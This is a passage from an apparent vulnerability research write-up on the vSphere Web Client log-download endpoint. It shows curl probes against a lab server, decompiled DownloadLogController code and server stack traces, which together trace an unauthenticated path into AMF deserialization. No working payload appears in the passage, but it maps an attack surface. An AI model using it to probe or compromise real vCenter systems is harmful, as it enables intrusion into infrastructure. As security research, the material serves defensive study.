handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> GET /vsphere-client/download/logs?webClientSessionId=nope HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 405\r\n< Set-Cookie: JSESSIONID=3DDE7D387076B9E7814A940DACA2B6B4; Path=/vsphere-client; Secure; HttpOnly; SameSite=None\r\n< Allow: POST\r\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n< Pragma: no-cache\r\n< Expires: 0\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-XSS-Protection: 1; mode=block\r\n< X-Frame-Options: SAMEORIGIN\r\n< X-Content-Type-Options: nosniff\r\n< Content-Type: text/html;charset=utf-8\r\n< Content-Language: en\r\n< Content-Length: 749\r\n< Date: Sat, 04 Dec 2021 00:57:46 GMT\r\n< Server: Anonymous\r\n<\r\n* Connection #0 to host 172.16.57.237 left intact\r\n<!doctype html><html lang=\"en\"><head><title>HTTP Status 405 \u2013 Method Not Allowed</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 \u2013 Method Not Allowed</h1><hr class=\"line\" /><p><b>Type</b> Status Report</p><p><b>Message</b> Request method &#39;GET&#39; not supported</p><p><b>Description</b> The method received in the request-line is known by the origin server but not supported by the target resource.</p><hr class=\"line\" /><h3>Apache Tomcat/8.5.61</h3></body></html>wvu@kharak:~$\r\n```\r\n\r\n```\r\n[2021-12-04T00:57:46.537Z] [WARN ] http-nio-9090-exec-2         70000066 ###### ###### o.s.web.servlet.mvc.support.DefaultHandlerExceptionResolver       Resolved exception caused by handler execution: org.springframework.web.HttpRequestMethodNotSupportedException: Request method 'GET' not supported\r\n```\r\n\r\n## Testing a `POST` request with the `webClientSessionId` parameter\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs -d webClientSessionId=nope\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Content-Length: 23\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 200\r\n< Set-Cookie: JSESSIONID=950054453E83C0E133D9048BD60EEB61; Path=/vsphere-client; Secure; HttpOnly\r\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n< Pragma: no-cache\r\n< Expires: 0\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-XSS-Protection: 1; mode=block\r\n< X-Frame-Options: SAMEORIGIN\r\n< X-Content-Type-Options: nosniff\r\n< Content-Length: 0\r\n< Date: Sat, 04 Dec 2021 00:58:47 GMT\r\n< Server: Anonymous\r\n<\r\n* Connection #0 to host 172.16.57.237 left intact\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\n[2021-12-04T00:58:47.452Z] [WARN ] http-nio-9090-exec-5         70000067 ###### ###### com.vmware.vsphere.client.logbundle.DownloadLogController         ClientId is null.\r\n[2021-12-04T00:58:47.452Z] [ERROR] http-nio-9090-exec-5         70000067 ###### ###### com.vmware.vsphere.client.logbundle.DownloadLogController         There is no spec for downloading logs in the request.\r\n```\r\n\r\n## Analyzing the `DownloadLogController` class and discovering AMF deserialization\r\n\r\n```java\r\n  @RequestMapping(method = {RequestMethod.POST})\r\n  public void downloadLogBundles(final HttpServletRequest request, final HttpServletResponse response) throws IOException, Exception {\r\n    final DownloadingLogsTask downloadingLogsTask;\r\n    final HttpSession session = request.getSession();\r\n    Map<String, String[]> map = request.getParameterMap();\r\n    final String clientId = SessionUtil.getClientId(httpSession);\r\n    if (str == null)\r\n      _logger.warn(\"ClientId is null.\");\r\n    final SelectedLogsSpec selectedLogsSpec = processSelectedLogsSpecParameter(map);\r\n    final Collection<LogBundleDownloadSpec> logBundleDownloadSpecs = processLogBundleDownloadSpecs(map);\r\n    if (selectedLogsSpec == null && collection == null) {\r\n      _logger.error(\"There is no spec for downloading logs in the request.\");\r\n      return;\r\n    }\r\n    ManagedObjectReference managedObjectReference = DownloadingLogsTask.findTaskTarget(selectedLogsSpec, collection);\r\n    if (managedObjectReference != null) {\r\n      int i = extractFileIdParam(map);\r\n      downloadingLogsTask = new DownloadingLogsTask(str, managedObjectReference, i, this._queryExecutor, this._taskRegistry);\r\n    } else {\r\n      downloadingLogsTask = null;\r\n    }\r\n    try {\r\n      final ZipOutputStream zipStream = new ZipOutputStream((OutputStream)response.getOutputStream());\r\n      Runnable runnable = new Runnable() {\r\n          public void run() {\r\n            try {\r\n              SessionUtil.setHttpRequest(request);\r\n              SessionUtil.setHttpSession(session);\r\n              response.setContentType(\"application/zip\");\r\n              if (selectedLogsSpec == null) {\r\n                KeyStore keyStore = DownloadLogController.this._keystoreService.getKeyStore();\r\n                Map map = DownloadLogController.this.parseParameters(logBundleDownloadSpecs, clientId, keyStore);\r\n                DownloadLogController.this.writeZipFile(map, zipStream, clientId, downloadingLogsTask);\r\n              } else {\r\n                if (selectedLogsSpec.vCenterLogsIncluded) {\r\n                  ManagedObjectReference managedObjectReference = DownloadLogController.this.invokeGenerateLogBundlesTask(selectedLogsSpec.targetObjectReference, clientId);\r\n                  DownloadLogController.this.writeVcLogsToStream(zipStream, managedObjectReference, selectedLogsSpec, clientId, downloadingLogsTask);\r\n                  DownloadLogController.this.writeHostLogsToStream(zipStream, selectedLogsSpec, clientId, downloadingLogsTask);\r\n                } else {\r\n                  DownloadLogController.this.writeHostLogsToStream(zipStream, selectedLogsSpec, clientId, downloadingLogsTask);\r\n                }\r\n                zipStream.finish();\r\n              }\r\n              if (downloadingLogsTask != null)\r\n                downloadingLogsTask.updateState(TaskState.SUCCESS, null);\r\n            } catch (InterruptedException interruptedException) {\r\n              DownloadLogController._logger.info(\"Downloading logs task thread was interrupted.\");\r\n              Thread.currentThread().interrupt();\r\n            } catch (WriteIOException writeIOException) {\r\n              if (downloadingLogsTask != null) {\r\n                DownloadLogController._logger.info(\"Downloading logs is cancelled.\");\r\n                DownloadLogController._logger.debug(\"Exception in downloading logs: \", writeIOException);\r\n                downloadingLogsTask.updateState(TaskState.CANCELED, null);\r\n              }\r\n            } catch (Exception exception) {\r\n              DownloadLogController._logger.error(\"Error downloading logs.\", exception);\r\n              if (downloadingLogsTask != null) {\r\n                TaskState taskState = downloadingLogsTask.getState();\r\n                if (!TaskState.CANCELED.equals(taskState))\r\n                  downloadingLogsTask.updateState(TaskState.ERROR, exception);\r\n              }\r\n            }\r\n          }\r\n        };\r\n      FutureTask futureTask = new FutureTask(runnable, null);\r\n      if (downloadingLogsTask != null)\r\n        TaskUtil.addClientTaskKeyFutureCloseablePair(downloadingLogsTask\r\n            .getKey(), futureTask, zipOutputStream);\r\n      try {\r\n        ExecutorUtil.executeTasks(\r\n            Collections.singleton(futureTask), this._executor);\r\n      } catch (InterruptedException interruptedException) {}\r\n      if (downloadingLogsTask != null)\r\n        TaskUtil.removeClientTaskKeyFromMap(downloadingLogsTask.getKey());\r\n    } catch (Exception exception) {\r\n      if (downloadingLogsTask != null && TaskState.RUNNING ==\r\n\r\n        (downloadingLogsTask.getClientTaskInfo()).state)\r\n        downloadingLogsTask.updateState(TaskState.ERROR, exception);\r\n      throw exception;\r\n    }\r\n  }\r\n```\r\n\r\n```java\r\n  private SelectedLogsSpec processSelectedLogsSpecParameter(Map<String, String[]> paramMap) throws IOException {\r\n    String[] arrayOfString = paramMap.get(\"SelectedLogsSpec\");\r\n    if (ArrayUtil.isNullOrEmpty((Object[])arrayOfString))\r\n      return null;\r\n    return parseSelectedLogsSpec(arrayOfString[0]);\r\n  }\r\n```\r\n\r\n```java\r\n  private static SelectedLogsSpec parseSelectedLogsSpec(String paramString) throws IOException {\r\n    Base64.Decoder decoder = new Base64.Decoder();\r\n    decoder.decode(paramString);\r\n    byte[] arrayOfByte = decoder.flush();\r\n    ClassLoader classLoader1 = TypeMarshallingContext.getTypeMarshallingContext().getClassLoader();\r\n    ClassLoader classLoader2 = SelectedLogsSpec.class.getClassLoader();\r\n    Amf3Input amf3Input = new Amf3Input(getAmfSerializationContext(classLoader2));\r\n    amf3Input.setInputStream(new ByteArrayInputStream(arrayOfByte));\r\n    SelectedLogsSpec selectedLogsSpec = null;\r\n    try {\r\n      while (amf3Input.available() > 0) {\r\n        Object object = amf3Input.readObject();\r\n        if (object instanceof SelectedLogsSpec) {\r\n          selectedLogsSpec = (SelectedLogsSpec)object;\r\n        } else if (object instanceof Object[]) {\r\n          for (Object object1 : (Object[])object) {\r\n            if (object1 instanceof SelectedLogsSpec) {\r\n              selectedLogsSpec = (SelectedLogsSpec)object1;\r\n              break;\r\n            }\r\n          }\r\n        } else if (object instanceof Map) {\r\n          for (SelectedLogsSpec selectedLogsSpec1 : ((Map)object).values()) {\r\n            if (selectedLogsSpec1 instanceof SelectedLogsSpec) {\r\n              selectedLogsSpec = selectedLogsSpec1;\r\n              break;\r\n            }\r\n          }\r\n        }\r\n        if (selectedLogsSpec != null)\r\n          break;\r\n      }\r\n    } catch (ClassNotFoundException classNotFoundException) {\r\n      _logger.warn(\"The AMF deserialization fails.\", classNotFoundException);\r\n    } finally {\r\n      amf3Input.close();\r\n      TypeMarshallingContext.getTypeMarshallingContext()\r\n        .setClassLoader(classLoader1);\r\n    }\r\n    return selectedLogsSpec;\r\n  }\r\n```\r\n\r\n## Testing AMF deserialization using a bogus string\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs -d \"webClientSessionId=nope&SelectedLogsSpec=lol\"\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Content-Length: 44\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 500\r\n< Set-Cookie: JSESSIONID=587387E51FA794E6CE03FB9DBB454777; Path=/vsphere-client; Secure; HttpOnly\r\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n< Pragma: no-cache\r\n< Expires: 0\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-XSS-Protection: 1; mode=block\r\n< X-Frame-Options: SAMEORIGIN\r\n< X-Content-Type-Options: nosniff\r\n< Content-Type: text/html;charset=utf-8\r\n< Content-Length: 2977\r\n< Date: Sat, 04 Dec 2021 01:02:05 GMT\r\n< Connection: close\r\n< Server: Anonymous\r\n<\r\n\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<!-- saved from url=(0014)about:internet -->\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\">\r\n   <head>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n      <style type=\"text/css\" media=\"screen\">\r\n         html {\r\n            background: #3075ab; /* Old browsers */\r\n            background: -moz-linear-gradient(top,  #3a8dc8 0%, #183a62 100%); /* FF3.6+ */\r\n            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#3a8dc8), color-stop(100%,#183a62)); /* Chrome,Safari4+ */\r\n            background: -webkit-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Chrome10+,Safari5.1+ */\r\n            background: -o-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Opera 11.10+ */\r\n            background: -ms-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* IE10+ */\r\n            background: linear-gradient(to bottom,  #3a8dc8 0%,#183a62 100%); /* W3C */\r\n            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3a8dc8', endColorstr='#183a62',GradientType=0 ); /* IE6-9 */\r\n            background-repeat: no-repeat;\r\n\r\n            height: 100%;\r\n            overflow: auto;\r\n            margin: 0;\r\n            padding: 0;\r\n         }\r\n\r\n         #errorAreaWrapper {\r\n            position: relative;\r\n            float: left;\r\n            left: 50%;\r\n            margin-top: 30px;\r\n         }\r\n\r\n         #errorArea {\r\n            position: relative;\r\n            float: left;\r\n            left: -50%;\r\n            padding: 15px;\r\n            background-color: white;\r\n            font-size: 14px;\r\n            color: #000000;\r\n            font-family: Georgia, Arial, Helvetica, sans-serif;\r\n            border: 1px solid black;\r\n         }\r\n\r\n         #errorImage {\r\n            border: 0;\r\n            margin-right: 10px;\r\n            display: inline-block;\r\n            vertical-align: top;\r\n         }\r\n\r\n         #errorAllText {\r\n            display: inline-block;\r\n            vertical-align: top;\r\n            min-width: 500px;\r\n            max-width: 700px;\r\n         }\r\n\r\n         #errorSorry {\r\n            font-weight: bold;\r\n         }\r\n\r\n         #errorMessage {\r\n            padding-top: 10px;\r\n            padding-bottom: 10px;\r\n         }\r\n\r\n         #errorCheckLog {\r\n            font-style: italic;\r\n         }\r\n      </style>\r\n   </head>\r\n   <body>\r\n      <div id=\"errorAreaWrapper\">\r\n        <div id=\"errorArea\">\r\n          <div id=\"errorImage\"><img src=\"/vsphere-client/assets/warning48x.png\" alt=\"Error\" /></div>\r\n          <div id=\"errorAllText\">\r\n             <div id=\"errorSorry\">A server error occurred.</div>\r\n             <div id=\"errorMessage\">a partial block (3 of 4 bytes) was dropped, decoded data is probably truncated!</div>\r\n             <div id=\"errorCheckLog\">Check the vSphere Web Client server logs for details.</div>\r\n          </div>\r\n        </div>\r\n      </div>\r\n   </body>\r\n</html>\r\n* Closing connection 0\r\n* TLSv1.2 (OUT), TLS alert, close notify (256):\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\n[2021-12-04T01:02:05.830Z] [WARN ] http-nio-9090-exec-8         70000068 ###### ###### com.vmware.vsphere.client.logbundle.DownloadLogController         ClientId is null.\r\n[2021-12-04T01:02:05.831Z] [ERROR] http-nio-9090-exec-8          o.a.c.c.C.[.[localhost].[/vsphere-client].[downloadManager]       Servlet.service() for servlet [downloadManager] in context with path [/vsphere-client] threw exception [Request processing failed; nested exception is java.lang.IllegalStateException: a partial block (3 of 4 bytes) was dropped, decoded data is probably truncated!] with root cause java.lang.IllegalStateException: a partial block (3 of 4 bytes) was dropped, decoded data is probably truncated!\r\n\tat flex.messaging.util.Base64$Decoder.flush(Base64.java:136)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.parseSelectedLogsSpec(DownloadLogController.java:732)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.processSelectedLogsSpecParameter(DownloadLogController.java:584)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.downloadLogBundles(DownloadLogController.java:201)\r\n\tat sun.reflect.GeneratedMethodAccessor196.invoke(Unknown Source)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:498)\r\n\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:181)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:440)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:428)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:661)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:742)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:150)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat com.vmware.vise.security.websso.SecurityRequestWrapperFilter.doFilterInternal(SecurityRequestWrapperFilter.java:47)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:214)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:177)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:347)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:263)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SessionManagementFilter.doFilter(SessionManagementFilter.java:177)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vsphere.client.logging.MDCLogFilter.doFilterInternal(MDCLogFilter.java:41)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.extensionfw.DeploymentFilter.doFilter(DeploymentFilter.java:55)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.util.jsp.JspFilter.doFilterInternal(JspFilter.java:91)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SameSiteCookieHeaderFilter.doFilter(SameSiteCookieHeaderFilter.java:73)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)\r\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)\r\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:544)\r\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143)\r\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)\r\n\tat org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:764)\r\n\tat org.eclipse.virgo.web.tomcat.support.ApplicationNameTrackingValve.invoke(ApplicationNameTrackingValve.java:33)\r\n\tat org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)\r\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)\r\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)\r\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:616)\r\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)\r\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)\r\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1634)\r\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n```\r\n\r\n## Testing AMF deserialization using a Base64-encoded string\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs -d \"webClientSessionId=nope&SelectedLogsSpec=QQ==\"\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Content-Length: 45\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 500\r\n< Set-Cookie: JSESSIONID=1488241428F4AE1E7A8175ACAD6A276F; Path=/vsphere-client; Secure; HttpOnly\r\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n< Pragma: no-cache\r\n< Expires: 0\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-XSS-Protection: 1; mode=block\r\n< X-Frame-Options: SAMEORIGIN\r\n< X-Content-Type-Options: nosniff\r\n< Content-Type: text/html;charset=utf-8\r\n< Content-Length: 2920\r\n< Date: Sat, 04 Dec 2021 01:02:59 GMT\r\n< Connection: close\r\n< Server: Anonymous\r\n<\r\n\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 